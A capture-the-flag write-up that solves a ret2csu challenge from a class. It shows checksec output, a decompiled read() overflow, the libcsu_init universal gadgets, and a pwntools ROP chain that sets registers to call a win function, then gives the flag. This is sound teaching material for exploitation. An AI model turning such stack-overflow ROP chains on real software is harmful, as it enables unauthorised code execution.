# Ret2csu:Solution


The binary is compiled with NX and Partial RELRO 
```
pwn checksec ./chal.bin
[*] '/root/workspace/vuln/ret2csu/chal/chal.bin'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  './'
```

and is dynamically linked to GLIBC.
```
ldd ./chal.bin
	libhelper.so => ./libhelper.so (0x0000004001a00000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x0000004001c56000)
	/lib64/ld-linux-x86-64.so.2 (0x0000004000000000)
```
We can exploit the read() function.
```
  undefined auStack_48 [24];
  undefined *local_30;
  undefined8 local_28;
  int local_1c;
  
  local_1c = 0x10;
  local_28 = 0xf;
  local_30 = auStack_48;
  printf("-------------------------------------\n",0x10,0xf,0x10,0x10,0);
  printf("but i keep cruisin\'\n");
  printf("can\'t stop, won\'t stop \x1b[0;31mMOV\x1b[0min\'\n");
  printf("it\'s like I got this music in my mind\n");
  printf("sayin\' it\'s gonna be alright\n");
  printf("         - shake it off, taylor swift\n");
  printf("-------------------------------------\n");
  printf("\x1b[0;31m>>> \x1b[0m ");
  read(0,local_30,(long)(local_1c + 0x1337));
  return 0;
```

The buffer is 64 and rbp is 8, therefore the padding is 72. This is also seen from sending A's into the program until it crashes at 73, and subtracting 1 so that the instruction pointer isn't overwrittn but the base pointer is. 

For a ret2csu problem we want to find the Universal Gadget which is in libcsu_init. There are two gadgets that make it up.
```
gadget 2:
mov	rdx,r15
mov	rsi,r14
mov	edi,r13d
call	qword[r12 + rbx * 8]
add	rbx,0x1
cmp	rbp,rbx
jne	0x400700

gadget 1:
add	rsp,0x8
pop	rbx
pop	rbp
pop	r12
pop	r13
pop	r14
pop	r15
retn
```

The registers being used in this binary have been modified by the accompanying so file. In order to populate the gadgets correctly we needed to be able to fill in rdi, rsi, rdx, r12, r13, and r14. The we could call the win function. 

The arguments required for the win function:
```
int64_t win(int32_t arg1, int32_t arg2, int32_t arg3, int32_t arg4 @ r12, int32_t arg5 @ r13, int32_t arg6 @ r14)
    
if ((arg1 == 0xbe && (arg2 == 0xb01d && (arg3 == 0xface && (arg4 == 0xbad && (arg5 == 0xd0 && arg6 == 0xc4a53))))))
```

Due to the modified registers being used, it is possible to use the each part of the universal gadget once, however gadget 1 could be used twice to make it easier. 

Filling in gadget one so it will populate into gadget 2 when it's called, also making the jump condition not met so that gadget 2 will fall through gadget 1 again.
```
chain += p64(0x40095a)		# address of first gadget
chain += p64(0x0) 		# pop rbx
chain += p64(0x1)		# pop rbp
chain += p64(0x600e48)		# pop r12 -> address of dereferenced fini
chain += p64(0xbe)		# pop r13 -> mov edi, r13d
chain += p64(0xb01d)		# pop r14 -> mov rsi, r14
chain += p64(0xface)		# pop r15 -> mov rdx, r15
```

Calling gadget 2 and populating r12, r13, and r14 for the win function.
```
chain += p64(0x400940)		# address of second gadget
chain += p64(0x0)		# add rsp,0x8

chain += p64(0x0)		# pop rbx
chain += p64(0x1)		# pop rbp
chain += p64(0xbad)		# pop r12
chain += p64(0xd0)		# pop r13
chain += p64(0xc4a53)		# pop r14
chain += p64(0x0)
```

Then calling the win function with the registers populated and sending the chain.
```
chain += p64(e.plt['win'])	# call the win function 

p.sendline(chain)
```

Then we get our flag!
```
flag{h3artBr3akers_g0nna_Br3ak}
```

Resources:
* Class slides
* Demo solve script
* Louie 
* Alex
